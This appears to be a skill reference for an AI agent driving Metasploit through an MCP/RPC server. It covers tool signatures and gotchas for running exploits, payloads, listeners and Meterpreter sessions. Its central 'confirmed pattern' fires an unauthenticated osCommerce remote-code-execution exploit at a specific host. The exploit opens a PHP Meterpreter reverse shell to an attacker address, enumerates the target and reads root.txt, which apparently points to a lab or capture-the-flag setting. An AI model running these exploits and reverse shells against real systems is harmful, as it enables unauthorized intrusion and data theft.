---
name: metasploit-mcp
description: >
  Usage reference for the Metasploit MCP server tools. Load when running exploits,
  generating payloads, managing sessions, or handling listeners via Metasploit RPC.
  Covers tool signatures, critical gotchas (run_as_job, no raw shell, post-modules),
  and the confirmed working exploit pattern for osCommerce / PHP Meterpreter.
---

# Metasploit MCP — Usage Reference

**RPC defaults (configured via env or opencode.json):**
```
MSF_SERVER=127.0.0.1  MSF_PORT=55553  MSF_SSL=false  MSF_PASSWORD=msfrpc
```

Start the daemon: `msfrpcd -P msfrpc -S -a 127.0.0.1 -p 55553`

---

## Tools

| Tool | Purpose |
|------|---------|
| `list_exploits(search_term)` | Search available exploit modules |
| `list_payloads(platform, arch)` | Search payloads by platform/arch |
| `generate_payload(payload_type, format_type, options)` | Generate & save payload file |
| `run_exploit(module_name, options, payload_name, payload_options, run_as_job)` | Run exploit |
| `run_auxiliary_module(module_name, options)` | Run auxiliary module |
| `run_post_module(module_name, session_id, options)` | Run post-exploitation module |
| `list_active_sessions()` | List open sessions |
| `send_session_command(session_id, command)` | Send command to Meterpreter/shell |
| `list_listeners()` | List active handlers/jobs |
| `start_listener(payload_type, lhost, lport)` | Start multi/handler |
| `stop_job(job_id)` | Kill a job/handler |
| `terminate_session(session_id)` | Kill a session |

---

## Critical Gotchas

### 1 — Always use `run_as_job=True` for exploits
Synchronous `run_exploit` blocks the MCP socket until the module exits.
For any exploit that opens a reverse handler, the call never returns.
```python
run_exploit(..., run_as_job=True)   # ← REQUIRED
```

### 2 — Never open a raw shell channel via `send_session_command`
Sending `shell` in a PHP Meterpreter session creates a blocking channel that
freezes the RPC socket. Use post-modules or `execute -f cmd.exe -a "..." -i -H` instead.

```python
# BAD — hangs RPC:
send_session_command(session_id=1, command="shell")

# GOOD — non-blocking command execution:
send_session_command(session_id=1, command='execute -f cmd.exe -a "/c whoami" -i -H')

# GOOD — post-module:
run_post_module("multi/general/execute", session_id=1,
                options={"COMMAND": "cmd.exe /c whoami"})
```

### 3 — Load stdapi before Meterpreter commands
PHP Meterpreter may report stdapi missing even though it is loaded. If `getuid`
or `sysinfo` fails, call `send_session_command(session_id, "load stdapi")` first.

### 4 — `sysinfo` output may arrive on the next call
With PHP Meterpreter the full `sysinfo` response sometimes piggybacks on the
output of the following command. If output looks truncated, issue any benign
follow-up command to flush it.

---

## Exploit Workflow (confirmed pattern)

```python
# 1. Fire the exploit as a background job
result = run_exploit(
    module_name="exploit/multi/http/oscommerce_installer_unauth_code_exec",
    options={
        "RHOSTS": "10.48.144.73",
        "RPORT":  443,
        "SSL":    True,
        "URI":    "/oscommerce-2.3.4/catalog/install/",
    },
    payload_name="php/meterpreter/reverse_tcp",
    payload_options={"LHOST": "192.168.243.47", "LPORT": 4444},
    run_as_job=True,
)
# result contains session_id if shell opened immediately

# 2. Verify session
sessions = list_active_sessions()

# 3. Enumerate without opening a shell channel
send_session_command(session_id=1, command="getuid")
send_session_command(session_id=1, command="sysinfo")

# 4. Read files
send_session_command(session_id=1,
    command='execute -f cmd.exe -a "/c type C:\\Users\\Administrator\\Desktop\\root.txt" -i -H')

# 5. Search for files
send_session_command(session_id=1, command="search -f flag.txt")
```

---

## RPC Recovery

If the MCP socket becomes unresponsive (stuck channel or crashed session):

```bash
# Kill the process holding port 55553:
fuser -k 55553/tcp

# Restart:
msfrpcd -P msfrpc -S -a 127.0.0.1 -p 55553
```

Wait ~8 seconds for the daemon to fully start before issuing MCP calls.
